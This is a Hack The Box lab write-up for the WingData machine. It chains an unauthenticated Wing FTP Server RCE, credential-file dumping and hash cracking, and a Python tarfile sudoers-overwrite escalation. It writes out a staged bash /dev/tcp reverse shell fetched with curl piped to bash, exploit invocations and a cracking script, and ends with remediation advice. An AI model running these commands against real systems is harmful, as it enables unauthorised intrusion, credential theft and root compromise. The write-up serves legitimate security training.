---
title: "HTB WingData Writeup"
summary: "Linux writeup covering Wing FTP exposure, configuration recovery, credential analysis, and privilege escalation."
date: 2026-06-12
tags:
  - htb
  - linux
  - web
  - cve
  - privilege-escalation
  - recon
category: "hack-the-box"
difficulty: "medium"
platform: "hackthebox"
boxImage: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d419202507a3bbf06e764c1c4a524f66.png"
draft: false
---
# Machine Information

|Field|Value|
|---|---|
|Machine|WingData|
|Platform|Hack The Box|
|Target IP|`[REDACTED_TARGET_IP]`|
|OS|Debian Linux|
|Initial Foothold|Wing FTP Server unauthenticated RCE|
|User Pivot|WingFTP user XML credential recovery|
|Privilege Escalation|Python `tarfile` filter bypass via CVE-2025-4517|
|User Flag|`[REDACTED_FLAG]`|
|Root Flag|`[REDACTED_FLAG]`|

---

## Summary

WingData exposed only SSH and HTTP externally. The HTTP service redirected to `wingdata.htb`, where the main site leaked a second virtual host, `ftp.wingdata.htb`.

The second vhost was running **Wing FTP Server Free Edition**. The application was vulnerable to **CVE-2025-47812**, an unauthenticated null-byte/Lua injection vulnerability in Wing FTP Server’s web login flow. Exploiting it gave command execution as the `wingftp` service user.

From the Wing FTP configuration files, I recovered local user account XML files. The `wacky` WingFTP user hash was cracked using the known WingFTP salting format, giving SSH access as the Linux user `wacky`.

Privilege escalation was achieved through a sudo-permitted backup restore script:

```bash
/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script used Python `tarfile.extractall()` with `filter="data"`, which was exploitable through **CVE-2025-4517** using the following public PoC:

```text
https://github.com/AzureADTrent/CVE-2025-4517-POC
```

The exploit modified sudoers and granted `wacky` full sudo privileges, resulting in a root shell.

---

## 1. Reconnaissance

I first confirmed the target was alive:

```bash
ping [REDACTED_TARGET_IP]
```

Output:

```text
64 bytes from [REDACTED_TARGET_IP]: icmp_seq=1 ttl=63 time=16.4 ms
64 bytes from [REDACTED_TARGET_IP]: icmp_seq=2 ttl=63 time=22.5 ms
64 bytes from [REDACTED_TARGET_IP]: icmp_seq=3 ttl=63 time=18.9 ms
64 bytes from [REDACTED_TARGET_IP]: icmp_seq=4 ttl=63 time=27.0 ms
```

The TTL value suggested a Linux target.

I created a working directory and set the target IP:

```bash
cd ~/Desktop/Hack\ The\ Box/Machines/WingData
export IP=[REDACTED_TARGET_IP]
mkdir -p scans enum loot
```

---

## 2. Port Scanning

I ran RustScan with default Nmap scripts and version detection:

```bash
rustscan -a $IP --ulimit 5000 -- -sV -sC -oA scans/rustscan-init
```

Open ports:

```text
Open [REDACTED_TARGET_IP]:22
Open [REDACTED_TARGET_IP]:80
```

Nmap service output:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    Apache httpd 2.4.66
```

The HTTP title showed a redirect:

```text
Did not follow redirect to http://wingdata.htb/
```

I added the hostname to `/etc/hosts`:

```bash
echo "$IP wingdata.htb" | sudo tee -a /etc/hosts
```

A full TCP scan confirmed only ports `22` and `80` were externally exposed:

```bash
sudo nmap -p- --min-rate 5000 -Pn -oA scans/allports $IP
```

Output:

```text
22/tcp open  ssh
80/tcp open  http
```

---

## 3. Web Enumeration

I enumerated the main web service:

```bash
whatweb http://wingdata.htb
curl -i http://wingdata.htb/
curl -s http://wingdata.htb/ | tee enum/index.html
```

The main page contained a link/reference to:

```text
ftp.wingdata.htb
```

I added the second vhost:

```bash
echo "$IP ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

Then I fingerprinted the new vhost:

```bash
whatweb http://ftp.wingdata.htb
curl -i http://ftp.wingdata.htb/
```

Output:

```text
HTTP/1.1 200 HTTP OK
Server: Wing FTP Server(Free Edition)
```

The HTML redirected the browser to:

```text
login.html
```

This confirmed the second vhost was a Wing FTP Server web client.

---

## 4. Wing FTP Server Enumeration

I checked the login page and common paths:

```bash
curl -s http://ftp.wingdata.htb/login.html | tee enum/ftp-login.html
```

Directory brute forcing showed common WingFTP static directories:

```bash
ffuf -u http://ftp.wingdata.htb/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-o scans/ffuf-ftp-dirs.json
```

Interesting results:

```text
css
plugins
language
images
include
help
icons
```

The server fingerprint and structure matched Wing FTP Server.

---

## 5. Initial Foothold - CVE-2025-47812

### Vulnerability

The exposed Wing FTP Server was vulnerable to **CVE-2025-47812**.

This vulnerability affects Wing FTP Server versions before `7.4.4`. The web interface mishandles null bytes in the username parameter. This allows injection of arbitrary Lua code into session files, which can then be executed by interacting with authenticated endpoints such as `dir.html`.

The vulnerable endpoint was:

```text
/loginok.html
```

The exploit used a null byte in the username field and injected Lua code that executed system commands using `io.popen()`.

### PoC Used

I used Exploit-DB style PoC `52347.py`.

Basic test:

```bash
python3 52347.py -u http://ftp.wingdata.htb
```

Output:

```text
[*] Testing target: http://ftp.wingdata.htb
[+] http://ftp.wingdata.htb is vulnerable!
```

Command execution test:

```bash
python3 52347.py -u http://ftp.wingdata.htb -c 'id'
```

Output:

```text
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

The command execution context was the `wingftp` service account.

More enumeration:

```bash
python3 52347.py -u http://ftp.wingdata.htb -c 'pwd; uname -a; ls -la /home; cat /etc/passwd'
```

Output showed:

```text
/opt/wftpserver
Linux wingdata 6.1.0-42-amd64 ...
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
```

The interesting local user was:

```text
wacky
```

---

## 6. Reverse Shell as `wingftp`

Direct reverse shell payloads caused timeout behavior, so I used a staged payload.

On Kali, I created `rev.sh`:

```bash
cd ~/Desktop/Hack\ The\ Box/Machines/WingData/loot

cat > rev.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/[REDACTED_VPN_IP]/4444 0>&1
EOF

python3 -m http.server 8000
```

In another terminal:

```bash
nc -lvnp 4444
```

Then I triggered the payload:

```bash
python3 52347.py -u http://ftp.wingdata.htb \
-c 'curl -s http://[REDACTED_VPN_IP]:8000/rev.sh | bash'
```

The exploit request timed out, but the reverse shell connected:

```text
connect to [REDACTED_VPN_IP] from (UNKNOWN) [REDACTED_TARGET_IP]
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
wingftp@wingdata:/opt/wftpserver$
```

I confirmed access:

```bash
id
```

Output:

```text
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

---

## 7. WingFTP Configuration Enumeration

The Wing FTP installation was located at:

```text
/opt/wftpserver
```

Directory listing:

```bash
ls
```

Output:

```text
Data
License.txt
Log
lua
pid-wftpserver.pid
README
session
session_admin
version.txt
webadmin
webclient
wftpconsole
wftp_default_ssh.key
wftp_default_ssl.crt
wftp_default_ssl.key
wftpserver
```

I inspected administrator configuration:

```bash
cat /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
```

Output:

```xml
<ADMIN_ACCOUNTS Description="Wing FTP Server Admin Accounts">
    <ADMIN>
        <Admin_Name>admin</Admin_Name>
        <Password>[REDACTED_HASH]</Password>
        <Type>0</Type>
        <Readonly>0</Readonly>
        <IsDomainAdmin>0</IsDomainAdmin>
    </ADMIN>
</ADMIN_ACCOUNTS>
```

I also inspected the domain settings:

```bash
cat /opt/wftpserver/Data/1/settings.xml
```

Important settings:

```xml
<EnableSHA256>1</EnableSHA256>
<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>
```

This showed that Wing FTP password hashes used SHA-256 with the salt string:

```text
WingFTP
```

---

## 8. User Account Discovery

I searched for WingFTP user XML files:

```bash
find Data -type f -maxdepth 4 -ls
```

Interesting files:

```text
Data/1/users/maria.xml
Data/1/users/steve.xml
Data/1/users/wacky.xml
Data/1/users/anonymous.xml
Data/1/users/john.xml
```

I searched for passwords:

```bash
grep -Rni "Password" /opt/wftpserver/Data 2>/dev/null
```

Output:

```text
/opt/wftpserver/Data/1/users/maria.xml:7:        <Password>[REDACTED_HASH]</Password>
/opt/wftpserver/Data/1/users/steve.xml:7:        <Password>[REDACTED_HASH]</Password>
/opt/wftpserver/Data/1/users/wacky.xml:7:        <Password>[REDACTED_HASH]</Password>
/opt/wftpserver/Data/1/users/anonymous.xml:7:        <Password>[REDACTED_HASH]</Password>
/opt/wftpserver/Data/1/users/john.xml:7:        <Password>[REDACTED_HASH]</Password>
```

The target user hash was:

```text
wacky:[REDACTED_HASH]
```

The anonymous account was also useful because it had password disabled:

```xml
<UserName>anonymous</UserName>
<EnablePassword>0</EnablePassword>
<Password>[REDACTED_HASH]</Password>
```

---

## 9. Pivot to `wacky`

### Modifying `wacky.xml`

Because the WingFTP user XML files were writable by `wingftp`, I modified `wacky.xml` and disabled password authentication for the WingFTP virtual user.

Backup:

```bash
cp /opt/wftpserver/Data/1/users/wacky.xml /tmp/wacky.xml.bak2
```

Patch:

```bash
sed -i 's#<EnablePassword>1</EnablePassword>#<EnablePassword>0</EnablePassword>#' \
/opt/wftpserver/Data/1/users/wacky.xml
```

Verification:

```bash
grep -n "UserName\|EnablePassword\|Password" /opt/wftpserver/Data/1/users/wacky.xml
```

Output:

```text
4:        <UserName>wacky</UserName>
6:        <EnablePassword>0</EnablePassword>
7:        <Password>[REDACTED_HASH]</Password>
```

Testing login from Kali:

```bash
curl -i -s -X POST http://ftp.wingdata.htb/loginok.html \
-H 'Host: ftp.wingdata.htb' \
-H 'Content-Type: application/x-www-form-urlencoded' \
--data 'username=wacky&password=' | grep -i 'Set-Cookie'
```

Output:

```text
Set-Cookie: UID=[REDACTED_HASH]; HttpOnly
```

This confirmed the WingFTP `wacky` account could now log in without a password.

### Cracking the Original `wacky` Hash

For Linux SSH access, I cracked the original `wacky` hash using SHA-256 with the `WingFTP` salt appended.

Cracking script:

```bash
cat > crack_wingftp.py <<'PY'
import hashlib, gzip, sys, os

target = "[REDACTED_HASH]"
salt = "WingFTP"
paths = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/rockyou.txt.gz"
]

for path in paths:
    if not os.path.exists(path):
        continue
    opener = gzip.open if path.endswith(".gz") else open
    with opener(path, "rt", errors="ignore") as f:
        for line in f:
            pw = line.rstrip("\n")
            if hashlib.sha256((pw + salt).encode()).hexdigest() == target:
                print("[FOUND]", pw)
                sys.exit(0)
print("[!] Not found")
PY

python3 crack_wingftp.py
```

Output:

```text
[FOUND] [REDACTED_PASSWORD]
```

Credentials:

```text
wacky:[REDACTED_PASSWORD]
```

---

## 10. SSH as `wacky`

I used the cracked password to SSH into the machine:

```bash
ssh wacky@[REDACTED_TARGET_IP]
```

Password:

```text
[REDACTED_PASSWORD]
[REDACTED_PASSWORD]
```

After login:

```bash
id
hostname
pwd
ls -la
cat ~/[REDACTED_FLAG_PATH]
```

Output:

```text
uid=1001(wacky) gid=1001(wacky) groups=1001(wacky)
wingdata
/home/wacky
```

User flag:

```text
[REDACTED_HASH]
```

---

## 11. Privilege Escalation Enumeration

I checked the interesting directory `/opt/backup_clients`:

```bash
ls -la /opt/backup_clients
```

Output:

```text
drwxr-x--- 4 root wacky 4096 Jan 12 08:43 .
drwxr-xr-x 4 root root  4096 Feb  9 08:19 ..
drwxrwx--- 2 root wacky 4096 Jan 12 08:32 backups
-rwxr-x--- 1 root wacky 2829 Jan 12 08:37 restore_backup_clients.py
drwxr-x--- 2 root wacky 4096 Jan 12 08:43 restored_backups
```

The `backups` directory was writable by group `wacky`, and the restore script was readable/executable.

I checked sudo privileges:

```bash
sudo -l
```

Output:

```text
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

This meant `wacky` could run the backup restore script as root.

---

## 12. Reviewing `restore_backup_clients.py`

Script:

```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

The dangerous operation was:

```python
tar.extractall(path=staging_dir, filter="data")
```

Normally, `filter="data"` is meant to mitigate classic tar path traversal. I first tested common tar exploitation techniques manually.

### Failed Traversal Test

I attempted to write outside the extraction directory using `../../../../etc/sudoers.d/wackyroot`.

The script blocked it:

```text
[!] Error during extraction: '../../../../etc/sudoers.d/wackyroot' would be extracted to '/etc/sudoers.d/wackyroot', which is outside the destination
```

### Failed SUID Bash Test

I attempted to extract a root-owned SUID bash binary:

```bash
cp /bin/bash /tmp/rootshell
```

The file extracted as root-owned but the SUID bit was stripped:

```text
-rwxr-xr-x 1 root root 1265648 /opt/backup_clients/restored_backups/restore_suid/rootshell
```

### Failed Hardlink/Symlink Tests

Absolute hardlink and symlink attempts were also blocked:

```text
[!] Error during extraction: 'rootlink' is a link to an absolute path
```

At this point, the usual TarSlip and SUID archive attacks were mitigated.

---

## 13. Privilege Escalation - CVE-2025-4517

### Vulnerability

The target had Python `3.12.3`:

```bash
/usr/local/bin/python3 --version
```

Output:

```text
Python 3.12.3
```

The restore script used:

```python
tar.extractall(path=staging_dir, filter="data")
```

This matched **CVE-2025-4517**, a Python `tarfile` vulnerability that allows arbitrary filesystem writes outside the extraction directory when extracting untrusted tar archives with `filter="data"` or `filter="tar"`.

### PoC Used

I used the following public PoC as requested:

```text
https://github.com/AzureADTrent/CVE-2025-4517-POC
```

The PoC abuses a symlink and hardlink chain to bypass Python’s `filter="data"` extraction protection and write a sudoers entry.

---

## 14. Running the CVE-2025-4517 PoC

I already had the PoC available on the target as:

```text
/tmp/CVE-2025-4517-POC.py
```

When trying to download directly from the target, DNS failed:

```bash
wget https://raw.githubusercontent.com/AzureADTrent/CVE-2025-4517-POC/refs/heads/main/CVE-2025-4517-POC.py
```

Output:

```text
Resolving raw.githubusercontent.com failed: Temporary failure in name resolution.
```

So the PoC was transferred from Kali instead.

On the target, I ran:

```bash
cd /tmp
python3 CVE-2025-4517-POC.py
```

Output:

```text
[*] Target user: wacky
[*] Creating exploit tar for user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
[+] Exploit deployed successfully
[*] Triggering extraction via vulnerable script...
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999

[+] Extraction completed
[*] Verifying exploit success...
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL

============================================================
[+] EXPLOITATION SUCCESSFUL!
[+] User 'wacky' now has full sudo privileges
[+] Get root with: sudo /bin/bash
============================================================
```

When prompted:

```text
[?] Spawn root shell now? (y/n):
```

I selected:

```text
y
```

This spawned a root shell:

```text
root@wingdata:/tmp#
```

Verification:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Root flag:

```bash
cat /root/[REDACTED_FLAG_PATH]
```

Output:

```text
[REDACTED_HASH]
```

---

## 15. Notes on Sudoers Side Effect

After exploitation, running `sudo -l` as root showed:

```text
User root is not allowed to run sudo on wingdata.
root is not in the sudoers file.
```

This likely happened because the PoC overwrote or altered `/etc/sudoers` instead of safely appending a separate drop-in file.

However, this did not matter for the machine objective because a root shell had already been obtained and the root flag was readable.

---

## 16. Attack Chain

Full chain:

```text
1. Port scan found SSH and HTTP.
2. HTTP redirected to wingdata.htb.
3. Main site exposed ftp.wingdata.htb.
4. ftp.wingdata.htb ran Wing FTP Server Free Edition.
5. Wing FTP Server was vulnerable to CVE-2025-47812.
6. CVE-2025-47812 gave unauthenticated RCE as wingftp.
7. WingFTP user XML files exposed salted SHA-256 hashes.
8. wacky hash was cracked as [REDACTED_PASSWORD].
9. SSH login as wacky succeeded.
10. wacky had sudo permission to run restore_backup_clients.py as root.
11. restore_backup_clients.py used tarfile.extractall(..., filter="data").
12. CVE-2025-4517 PoC bypassed tarfile filter protection.
13. PoC modified sudoers and granted wacky full sudo.
14. sudo /bin/bash produced root shell.
15. [REDACTED_FLAG_PATH] was captured.
```

---

## 17. Proof

### User

```bash
id
cat /home/wacky/[REDACTED_FLAG_PATH]
```

Output:

```text
uid=1001(wacky) gid=1001(wacky) groups=1001(wacky)
[REDACTED_HASH]
```

### Root

```bash
id
cat /root/[REDACTED_FLAG_PATH]
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
[REDACTED_HASH]
```

---

## 18. Remediation

### Wing FTP Server

Upgrade Wing FTP Server to version `7.4.4` or later to patch CVE-2025-47812.

Additional hardening:

```text
Disable anonymous login if not required.
Restrict web client access to trusted IP ranges.
Monitor WingFTP session directories for injected Lua files.
Avoid running file transfer services with root privileges.
```

### Python Tar Extraction

Patch Python to a version containing fixes for CVE-2025-4517.

Avoid extracting untrusted tar archives as root. Even with `filter="data"`, additional validation should be implemented:

```python
import os
import tarfile

def safe_extract(tar, path):
    base = os.path.abspath(path)

    for member in tar.getmembers():
        target = os.path.abspath(os.path.join(base, member.name))

        if not target.startswith(base + os.sep):
            raise Exception("Blocked path traversal")

        if member.issym() or member.islnk():
            raise Exception("Blocked symlink/hardlink")

        if member.isdev():
            raise Exception("Blocked device file")

    tar.extractall(path)
```

### Sudo Rule

Avoid broad wildcard sudo rules like:

```text
wacky ALL=(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

Instead:

```text
Use least privilege.
Avoid running archive extraction as root.
Validate input files before extraction.
Use a dedicated low-privilege service account.
Use AppArmor/SELinux profiles for backup restore workflows.
```

---

## 19. Key Takeaways

This machine demonstrated three important issues:

```text
1. Exposed management/file-transfer software can become the initial foothold.
2. Application configuration files often contain reusable credential material.
3. "Safe" extraction filters are not always safe when affected by implementation-level CVEs.
```

The most important vulnerability in the final root path was:

```text
CVE-2025-4517 - Python tarfile filter bypass leading to arbitrary file write
PoC: https://github.com/AzureADTrent/CVE-2025-4517-POC
```
